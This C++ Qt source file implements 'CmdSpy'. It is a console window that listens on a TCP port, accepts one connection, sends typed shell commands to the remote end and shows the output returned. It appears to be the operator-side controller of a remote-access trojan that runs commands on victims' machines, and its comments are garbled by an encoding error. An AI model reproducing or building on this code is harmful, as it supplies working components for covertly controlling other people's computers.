#include "CmdSpy.h"

CmdSpy::CmdSpy(QWidget* parent) :
    QWidget(parent), mSock(0), mCmdRet(0)

{
    // ��ʼ������
    const int w = 800, h = 550;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - h) >> 1;
    this->setGeometry(x, y, w, h);

    // ��ʼ���༭��
    mCmdRet = new QTextEdit(this);
    mCmdRet->setGeometry(0, 0, w, h - 25);
    mCmdRet->setStyleSheet("QTextEdit {background: black; color: white;}");
    mCmdRet->setReadOnly(true);

    // ��ʼ��������ָ��༭��
    mCmdEdit = new QLineEdit(this);
    mCmdEdit->setGeometry(0, h - mCmdRet->height(), w, 25);
    mCmdEdit->setStyleSheet("QLineEdit {background: blue; color: white;}");
    mCmdEdit->setFocus();
    connect(mCmdEdit, SIGNAL(textChanged(QString)), this, SLOT(textChanged()));
    connect(mCmdEdit, SIGNAL(returnPressed()), this, SLOT(newCommand()));
}

int CmdSpy::startCmdSpyServer(QString userName)
{
    // ���ô��ڱ���
    this->setWindowTitle(userName.append("-Cmd����"));

    // �����µķ����
    mServer = new TcpServer(this);
    connect(mServer, SIGNAL(newConnection(QTcpSocket*)), this, SLOT(newConnection(QTcpSocket*)));

    mServer->start(0);
    if (!mServer->server()->isListening()) {
        qDebug() << "����Cmd���Ʒ����ʧ��";
        deleteLater();
        return -1;
    }

    // ������ش���
    this->show();

    return mServer->server()->serverPort();
}

void CmdSpy::sendCommand(QString cmd)
{
    if (mSock) {
        cmd.append(CmdEnd);
        mSock->write(cmd.toLocal8Bit());
    }
}

void CmdSpy::addRetValue(QString retValue)
{
    if (mCmdRet) {
        _curRet.append(retValue);
        mCmdRet->clear();
        mCmdRet->setText(_curRet);

        // ��������ʾ��ײ�
        QScrollBar* scrollbar = mCmdRet->verticalScrollBar();
        scrollbar->setSliderPosition(scrollbar->maximum());
    }
}

void CmdSpy::newConnection(QTcpSocket* s)
{
    // �����ͻ�
    mSock = new TcpSocket(s, this);
    connect(mSock, SIGNAL(newData()), this, SLOT(processBuffer()));
    connect(mSock, SIGNAL(disconnected()), this, SLOT(deleteLater()));

    // ��ȡ·��
    sendCommand("");

    // ���ټ����¿ͻ�
    mServer->server()->close();
}

void CmdSpy::processBuffer()
{
    // ��socket���ȡ������
    QByteArray* buf = mSock->buffer();

    int endIndex;
    while ((endIndex = buf->indexOf(CmdEnd)) > -1) {
        // ��ȡһ��ָ��
        QByteArray retValue = buf->mid(0, endIndex);
        buf->remove(0, endIndex + CmdEnd.length());

        if (retValue.mid(0, CmdPWD.size()) == CmdPWD) {
            // ����ǰλ��
            retValue = retValue.mid(CmdPWD.size() + CmdSplit.size(),
                retValue.size() - CmdPWD.size() - CmdSplit.size());
            addRetValue("\r\n" + QString::fromLocal8Bit(retValue.append("> ")));
        }
        else {
            // ����ָ���ֵ
            addRetValue(QString::fromLocal8Bit(retValue) + "\r\n");
        }
    }
}

void CmdSpy::textChanged()
{
    // ������ʾ��
    mCmdRet->setText(_curRet + mCmdEdit->text());

    // ��������ʾ��ײ�
    QScrollBar* scrollbar = mCmdRet->verticalScrollBar();
    scrollbar->setSliderPosition(scrollbar->maximum());
}

void CmdSpy::newCommand()
{
    QString cmd = mCmdEdit->text();

    // ������ʾ��
    addRetValue(cmd + "\r\n");

    // ����ָ��
    sendCommand(cmd);

    // ��ձ༭��
    mCmdEdit->setText("");

    // ���cmd����clear���������ʾ��
    if (cmd.toUpper() == "CLEAR") {
        mCmdRet->clear();
        _curRet = "";
    }
}

void CmdSpy::resizeEvent(QResizeEvent*)
{
    if (mCmdRet && mCmdEdit) {
        mCmdRet->setGeometry(0, 0, width(), height() - 25);
        mCmdEdit->setGeometry(0, height() - 25, width(), 25);
    }
}

void CmdSpy::closeEvent(QCloseEvent*)
{
    deleteLater();
}